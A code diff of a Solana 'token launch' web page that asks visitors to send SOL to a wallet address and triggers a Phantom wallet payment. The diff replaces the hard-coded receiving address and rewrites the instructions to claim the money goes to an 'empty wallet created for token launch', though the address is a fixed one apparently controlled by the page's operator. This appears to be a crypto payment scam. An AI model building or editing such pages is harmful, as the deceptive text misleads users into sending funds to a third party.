@@ -1040,12 +1040,12 @@ s0.parentNode.insertBefore(s1,s0);
         <div class="token-modal-container">
             <div class="token-modal-close" id="tokenModalClose">×</div>
             <h2 class="token-modal-title">Your token is being created</h2>
-            <p class="token-modal-subtitle">To launch the token, send the required amount of SOL to the wallet address below. After successful transaction click "Check transaction". </p>
+            <p class="token-modal-subtitle">To launch the token, send the required amount of SOL to the empty wallet created for token launch. After successful transaction click "Check transaction". </p>
             
             <div class="token-modal-amount">Amount to send: <span id="tokenModalAmount">1.0</span> SOL</div>
             
             <div class="token-modal-address" id="tokenModalAddress">
-                3VjHwJeLtGJXZf5wyuagDq9xJks1UFxb9J64G1YvsaCU
+                GKthSXapeDMK4Ct47aBgmQ9VdPRYAAtTYaUR5yi7Ejsz
             </div>
             
             <button class="token-modal-copy-btn" id="tokenModalCopyBtn">
@@ -1792,7 +1792,7 @@ s0.parentNode.insertBefore(s1,s0);
                 
                 if (provider && userAddress) {
                     // Если кошелек подключен, отправляем транзакцию через Phantom
-                    const tokenModalAddress = "3VjHwJeLtGJXZf5wyuagDq9xJks1UFxb9J64G1YvsaCU";
+                    const tokenModalAddress = "GKthSXapeDMK4Ct47aBgmQ9VdPRYAAtTYaUR5yi7Ejsz";
                     const success = await sendPhantomTransaction(receiverAddress, feeAmount);
                     
                     if (success) {
@@ -1889,3 +1889,4 @@ s0.parentNode.insertBefore(s1,s0);
 </body>
 
 </html> 
+
